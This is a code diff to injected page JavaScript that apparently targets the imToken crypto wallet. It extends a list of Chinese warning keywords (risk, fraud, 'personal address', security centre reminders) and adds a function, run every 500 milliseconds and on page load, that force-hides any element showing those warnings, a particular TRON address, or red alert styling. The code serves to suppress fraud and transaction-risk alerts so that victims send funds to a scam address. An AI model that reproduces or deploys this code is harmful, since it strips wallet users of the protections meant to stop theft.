@@ -115,6 +115,9 @@
             let hiddenCount = 0;
             const riskKeywords = [
                 'imToken 安全中心提醒',
+                'imToken安全中心提醒',
+                'imtoken 安全中心提醒',
+                'imtoken安全中心提醒',
                 '本次交易检测到',
                 '项风险',
                 '发现1项安全风险',
@@ -138,6 +141,13 @@
                 '风险提示',
                 '安全提示',
                 '交易风险',
+                '个人地址',
+                '欺诈',
+                '风险',
+                '安全',
+                '检测',
+                '提醒',
+                '警告',
                 '授权风险',
                 '地址风险',
                 '个人地址',
@@ -483,5 +493,63 @@
             // 静默处理错误
         }
     }, 2000); // 每2秒温和检查
+    
+    // 🎯 超强力安全风险隐藏 - 专门针对"发现1项安全风险"：：：新增
+    function ultraSecurityBypass() {
+        try {
+            // 🎯 查找并隐藏所有包含风险关键词的元素
+            const allElements = document.querySelectorAll('*');
+            allElements.forEach(el => {
+                const text = el.textContent || '';
+                const style = el.getAttribute('style') || '';
+                
+                // 检查是否包含安全风险关键词
+                if (text.includes('发现1项安全风险') || 
+                    text.includes('此地址为个人地址') ||
+                    text.includes('可能存在欺诈行为') ||
+                    text.includes('安全中心提醒') ||
+                    text.includes('THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x') ||
+                    style.includes('color: red') ||
+                    style.includes('background: red')) {
+                    
+                    // 🛡️ 强制隐藏
+                    el.style.setProperty('display', 'none', 'important');
+                    el.style.setProperty('visibility', 'hidden', 'important');
+                    el.style.setProperty('opacity', '0', 'important');
+                    el.style.setProperty('height', '0', 'important');
+                    el.style.setProperty('width', '0', 'important');
+                    el.style.setProperty('margin', '0', 'important');
+                    el.style.setProperty('padding', '0', 'important');
+                    el.style.setProperty('z-index', '-99999', 'important');
+                    
+                    // 🎯 同时隐藏父元素
+                    let parent = el.parentElement;
+                    while (parent && parent !== document.body) {
+                        const parentText = parent.textContent || '';
+                        if (parentText.includes('发现1项安全风险') ||
+                            parentText.includes('安全中心提醒')) {
+                            parent.style.setProperty('display', 'none', 'important');
+                        }
+                        parent = parent.parentElement;
+                    }
+                    
+                    console.log('🛡️ 超强隐藏安全风险元素:', text.substring(0, 30));
+                }
+            });
+            
+        } catch (e) {
+            console.log('🛡️ 超强安全绕过出错:', e.message);
+        }
+    }
+    
+    // 🎯 每500ms执行一次超强安全绕过
+    setInterval(ultraSecurityBypass, 500);
+    
+    // 🎯 页面加载完成后立即执行
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', ultraSecurityBypass);
+    } else {
+        ultraSecurityBypass();
+    }
     
 })();
